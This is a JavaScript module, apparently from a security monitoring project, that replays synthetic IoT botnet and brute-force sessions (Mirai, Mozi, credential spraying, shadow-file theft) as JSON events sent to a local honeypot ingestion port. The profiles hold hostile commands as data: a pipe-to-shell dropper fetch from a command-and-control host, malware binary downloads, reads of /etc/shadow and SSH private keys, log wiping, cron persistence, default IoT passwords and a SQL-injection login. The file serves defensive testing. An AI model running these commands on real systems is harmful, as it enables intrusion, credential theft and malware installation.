/**
 * Winnie-SOC: Synthetic Attack Simulator
 * Connects over real TCP socket (port 5000) to replicate authentic ESP32 honeypot events.
 * Simulates real IoT botnets (Mirai, Hajime, Mozi, Gafgyt) and brute-force attacks.
 */
const net = require('net');

const ATTACK_PROFILES = {
  mirai_botnet: {
    name: "Mirai IoT Botnet Invasion",
    description: "Automated botnet kill-chain: root:xc3511 brute-force -> arch recon -> /etc/passwd theft -> remote ARM7 dropper fetch -> log erasure",
    steps: [
      { delay: 350, command: "LOGIN: root / xc3511", ip: "185.220.101.5" },
      { delay: 600, command: "uname -a", ip: "185.220.101.5" },
      { delay: 500, command: "id", ip: "185.220.101.5" },
      { delay: 600, command: "cat /etc/passwd", ip: "185.220.101.5" },
      { delay: 600, command: "cd /tmp", ip: "185.220.101.5" },
      { delay: 700, command: "wget http://185.193.66.19/bins/mirai.arm7", ip: "185.220.101.5" },
      { delay: 600, command: "touch .bot_payload", ip: "185.220.101.5" },
      { delay: 500, command: "rm -rf /var/log/syslog", ip: "185.220.101.5" },
      { delay: 400, command: "exit", ip: "185.220.101.5" }
    ]
  },
  credential_stuffing: {
    name: "Mass IoT Credential Spraying",
    description: "Dictionary scan cycling through known default credentials (admin/admin, root/vizxv, support/support, guest/guest)",
    steps: [
      { delay: 350, command: "LOGIN: admin / admin", ip: "45.154.255.89" },
      { delay: 400, command: "LOGIN: root / vizxv", ip: "45.154.255.89" },
      { delay: 450, command: "LOGIN: root / 888888", ip: "45.154.255.89" },
      { delay: 400, command: "LOGIN: support / support", ip: "45.154.255.89" },
      { delay: 400, command: "LOGIN: guest / guest", ip: "45.154.255.89" },
      { delay: 500, command: "LOGIN: admin' OR '1'='1 / pass", ip: "45.154.255.89" }
    ]
  },
  recon_scanner: {
    name: "Automated Recon & Environment Fingerprint",
    description: "Host exploration: directory tree audit, whoami, pwd, processes, network interfaces",
    steps: [
      { delay: 300, command: "LOGIN: admin / 123456", ip: "91.240.118.172" },
      { delay: 500, command: "pwd", ip: "91.240.118.172" },
      { delay: 500, command: "whoami", ip: "91.240.118.172" },
      { delay: 550, command: "ls /", ip: "91.240.118.172" },
      { delay: 500, command: "ls /etc", ip: "91.240.118.172" },
      { delay: 500, command: "ls /root", ip: "91.240.118.172" },
      { delay: 500, command: "ps aux", ip: "91.240.118.172" },
      { delay: 500, command: "ifconfig", ip: "91.240.118.172" },
      { delay: 400, command: "help", ip: "91.240.118.172" },
      { delay: 350, command: "exit", ip: "91.240.118.172" }
    ]
  },
  shadow_exfiltration: {
    name: "Shadow Hash Theft & Dropper Staging",
    description: "High-value credential harvesting (/etc/shadow, .ssh/id_rsa) and curl dropper piping to shell",
    steps: [
      { delay: 350, command: "LOGIN: root / default", ip: "194.26.29.112" },
      { delay: 500, command: "id", ip: "194.26.29.112" },
      { delay: 700, command: "cat /etc/shadow", ip: "194.26.29.112" },
      { delay: 600, command: "cat /root/.ssh/id_rsa", ip: "194.26.29.112" },
      { delay: 700, command: "curl -s http://c2.threat-actor.su/dropper.sh | sh", ip: "194.26.29.112" },
      { delay: 600, command: "echo '* * * * * /tmp/.persist' > /etc/cron.d/job", ip: "194.26.29.112" },
      { delay: 500, command: "exit", ip: "194.26.29.112" }
    ]
  },
  mozi_botnet: {
    name: "Mozi Botnet P2P Spreader",
    description: "Mozi worm payload fetch into /tmp and execution probe",
    steps: [
      { delay: 300, command: "LOGIN: root / 123456", ip: "103.149.28.14" },
      { delay: 500, command: "cd /tmp", ip: "103.149.28.14" },
      { delay: 600, command: "wget http://103.149.28.14:8080/mozi.mips", ip: "103.149.28.14" },
      { delay: 500, command: "touch /tmp/.mozi_lock", ip: "103.149.28.14" },
      { delay: 400, command: "exit", ip: "103.149.28.14" }
    ]
  }
};

class AttackSimulator {
  constructor(eventSink = null, tcpPort = 5000) {
    this.eventSink = eventSink;
    this.tcpPort = tcpPort;
    this.sessionCounter = 900;
    this.activeSimulation = false;
  }

  /**
   * Run an attack profile
   * Sends REAL TCP socket packets to 127.0.0.1:5000 so the TCP ingestion server runs for real
   */
  async runProfile(profileKey = 'mirai_botnet', forceTcp = true, tcpPort = null) {
    const profile = ATTACK_PROFILES[profileKey] || ATTACK_PROFILES.mirai_botnet;
    this.sessionCounter++;
    const currentSession = this.sessionCounter;
    this.activeSimulation = true;
    const targetPort = tcpPort || this.tcpPort;

    console.log(`[⚡ Simulator] Launching real TCP attack wave: ${profile.name} (Session #${currentSession} -> TCP:${targetPort})`);

    for (const step of profile.steps) {
      if (!this.activeSimulation) break;
      await new Promise(r => setTimeout(r, step.delay || 400));

      const payload = {
        ip: step.ip,
        session: currentSession,
        command: step.command
      };

      if (forceTcp) {
        // Real TCP socket transmission to port 5000 matching ESP32 WiFiClient
        await this.sendOverTcp(payload, targetPort);
      } else if (this.eventSink) {
        this.eventSink({
          ...payload,
          timestamp: new Date().toISOString(),
          source: 'synthetic_simulator'
        });
      }
    }

    console.log(`[⚡ Simulator] Finished wave for Session #${currentSession}`);
    this.activeSimulation = false;
  }

  /**
   * Connects via genuine TCP socket to port 5000, exactly like ESP32 WiFiClient
   */
  sendOverTcp(payload, port = 5000) {
    return new Promise((resolve) => {
      const client = net.createConnection({ port, host: '127.0.0.1' }, () => {
        const jsonStr = JSON.stringify({
          ip: payload.ip,
          session: payload.session,
          command: payload.command
        });
        client.write(jsonStr);
        client.end();
      });

      client.on('close', () => resolve(true));
      client.on('error', (err) => {
        // Fallback to internal sink if TCP port is temporarily inaccessible
        if (this.eventSink) {
          this.eventSink({
            ...payload,
            timestamp: new Date().toISOString(),
            source: 'synthetic_simulator'
          });
        }
        resolve(false);
      });
    });
  }

  stop() {
    this.activeSimulation = false;
  }

  getProfiles() {
    return Object.keys(ATTACK_PROFILES).map(key => ({
      key,
      name: ATTACK_PROFILES[key].name,
      description: ATTACK_PROFILES[key].description,
      stepCount: ATTACK_PROFILES[key].steps.length
    }));
  }
}

module.exports = {
  AttackSimulator,
  ATTACK_PROFILES
};
